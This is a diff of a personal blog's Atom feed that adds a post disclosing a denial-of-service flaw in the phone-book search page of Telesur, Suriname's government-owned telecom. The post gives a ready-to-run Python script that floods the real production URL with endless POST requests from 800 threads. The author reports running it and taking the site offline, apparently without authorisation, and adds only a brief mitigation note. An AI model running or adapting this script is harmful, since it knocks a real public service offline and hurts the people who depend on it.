@@ -1,4 +1,104 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://girish-io.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://girish-io.github.io/" rel="alternate" type="text/html" /><updated>2019-12-13T21:49:33-03:00</updated><id>https://girish-io.github.io/</id><title type="html">Girish-IO</title><subtitle>My personal blog for writing about my discoveries and taking notes.</subtitle><entry><title type="html">Let’s get bloggin’!</title><link href="https://girish-io.github.io/welcome" rel="alternate" type="text/html" title="Let's get bloggin'!" /><published>2019-12-13T10:28:00-03:00</published><updated>2019-12-13T10:28:00-03:00</updated><id>https://girish-io.github.io/welcome</id><content type="html" xml:base="https://girish-io.github.io/welcome">&lt;p&gt;Hey there and welcome to my Blog!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://girish-io.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://girish-io.github.io/" rel="alternate" type="text/html" /><updated>2019-12-14T10:17:44-03:00</updated><id>https://girish-io.github.io/</id><title type="html">Girish-IO</title><subtitle>My personal blog for writing about my discoveries and taking notes.</subtitle><entry><title type="html">Tele0ops - Telesur Resource Starvation Attack Vulnerability</title><link href="https://girish-io.github.io/2019/12/13/tele0ops-resource-starvation-attack-vulnerability" rel="alternate" type="text/html" title="Tele0ops - Telesur Resource Starvation Attack Vulnerability" /><published>2019-12-13T22:43:01-03:00</published><updated>2019-12-13T22:43:01-03:00</updated><id>https://girish-io.github.io/2019/12/13/Tele0ops-Resource-Starvation-Attack-Vulnerability</id><content type="html" xml:base="https://girish-io.github.io/2019/12/13/tele0ops-resource-starvation-attack-vulnerability">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;A resource starvation vulnerability has been discovered on Telesur’s website &lt;a href=&quot;https://www.telesur.sr&quot;&gt;https://www.telesur.sr&lt;/a&gt;, the government-owned telecommunications company for Suriname. The resource starvation vulnerability can lead to a Denial of Service (DoS) of the server, rendering the website unavailable for any visitors. In this document I will demonstrate how this vulnerability can be exploited and mitigated.&lt;/p&gt;
+
+&lt;h1 id=&quot;vulnerable-pages&quot;&gt;Vulnerable Pages&lt;/h1&gt;
+&lt;p&gt;The following pages are vulnerable to the resource starvation attack:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.telesur.sr/mijn-telesur/telefoonboek/&quot;&gt;/mijn-telesur/telefoonboek/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;First, I will check whether the website is online with an online tool. I used &lt;a href=&quot;https://www.uptrends.com/tools/uptime&quot;&gt;Uptrends&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/1.png&quot; alt=&quot;website status&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great! Looks like it’s online.
+Now let’s head over to &lt;a href=&quot;https://www.telesur.sr/mijn-telesur/telefoonboek/&quot;&gt;/mijn-telesur/telefoonboek/&lt;/a&gt; and look up some phone numbers:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/2.png&quot; alt=&quot;telesur telefoonboek&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Through random experimentation I stumbled across something interesting whenever an asterisk “*”
+gets entered into the “name” field like so:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/3.png&quot; alt=&quot;telesur telefoonboek&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Submitting this request triggers the following error on the server:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/4.png&quot; alt=&quot;telesur telefoonboek error message&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like the server is trying to load all the data that exists in the database into memory and return it but when it hits the maximum data that is allowed to be loaded into memory (set in the ASP.NETconfiguration) which is 20 000 000 Bytes or 20 MB it returns the above error. This is a problem when there are multiple requests like this sent to the server which causes 20 MB to be loaded into memory for every request. Depending on the amount of requests sent and the amount of memory available on the server it can lead to a resource starvation attack and render the server unresponsive.&lt;/p&gt;
+
+&lt;p&gt;Let’s monitor the request and try sending it with a Python script:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/5.png&quot; alt=&quot;telesur telefoonboek error message&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;exploit-code&quot;&gt;Exploit code:&lt;/h3&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# exploit.py&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;threading&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;FORM_URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://www.telesur.sr/mijn-telesur/telefoonboek/'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;USER_AGENT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;HEADERS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'User-Agent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USER_AGENT&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;PAYLOAD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'ctl00$ctl00$ctl00$ContentPlaceHolderDefault$cp_mid$cp_content$Telefoonboek_11$tbNaam'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'ctl00$ctl00$ctl00$ContentPlaceHolderDefault$cp_mid$cp_content$Telefoonboek_11$tbAdres'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'ctl00$ctl00$ctl00$ContentPlaceHolderDefault$cp_mid$cp_content$Telefoonboek_11$btnSubmit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Zoek telefoonnummer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'__EVENTARGUMENT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'__EVENTTARGET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'__VIEWSTATE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'/wEPDwUENTM4MQ9kFgJmD2QWAmYPZBYCZg9kFgJmD2QWAgIND2QWAgILD2QWAgIBEGRkFgICAQ9kFgJmD2QWAgINDzwrABECARAWABYAFgAMFCsAAGQYAQVZY3RsMDAkY3RsMDAkY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyRGVmYXVsdCRjcF9taWQkY3BfY29udGVudCRUZWxlZm9vbmJvZWtfMTEkUmVzdWx0c0dyaWQPZ2QaLq2Bl/1/EvEOj8oEFDn3CWHLEDT6Ot8njNoshplL/Q=='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'__VIEWSTATEGENERATOR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'CA0B0334'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Sending request...'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FORM_URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HEADERS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Done.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_number&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Started thread #{thread_number}.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s execute the script:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$ python3 exploit.py&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;And let’s check the website status again:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/6.png&quot; alt=&quot;telesur website status&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;BOOM! The server is now unresponsive and we can’t load the main website.&lt;/p&gt;
+
+&lt;h1 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h1&gt;
+&lt;p&gt;A Google search for the exception thrown returned the following Stack Overflow answer:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tele0ops/7.png&quot; alt=&quot;Stackoverflow solution for mitigation&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/a/884248&quot;&gt;https://stackoverflow.com/a/884248&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So you should choose the maximum amount of memory that can be loaded for every request carefully and make sure not to choose a too big amount or else the server will be vulnerable to a DoS attack. Another option would be to implement &lt;a href=&quot;https://stackoverflow.com/a/11789529&quot;&gt;data paging&lt;/a&gt; for the returned results from the database.&lt;/p&gt;
+
+&lt;p&gt;The vulnerability was discovered on 4 Oct 2019.&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+&lt;p&gt;Yeaaahh, I know, they should hire me :)&lt;/p&gt;</content><author><name>Girish Oemrawsingh</name></author><category term="Exploitation" /><summary type="html">A resource starvation vulnerability has been discovered on Telesur’s website, the government-owned telecommunications company for Suriname. The resource starvation vulnerability can lead to a Denial of Service (DoS) of the server.</summary></entry><entry><title type="html">Let’s get bloggin’!</title><link href="https://girish-io.github.io/2019/12/13/welcome" rel="alternate" type="text/html" title="Let's get bloggin'!" /><published>2019-12-13T10:28:00-03:00</published><updated>2019-12-13T10:28:00-03:00</updated><id>https://girish-io.github.io/2019/12/13/welcome</id><content type="html" xml:base="https://girish-io.github.io/2019/12/13/welcome">&lt;p&gt;Hey there and welcome to my Blog!&lt;/p&gt;
 
 &lt;p&gt;I will use this blog to write down all my programming notes to make my life (and possibly yours as well) easier.&lt;/p&gt;
 
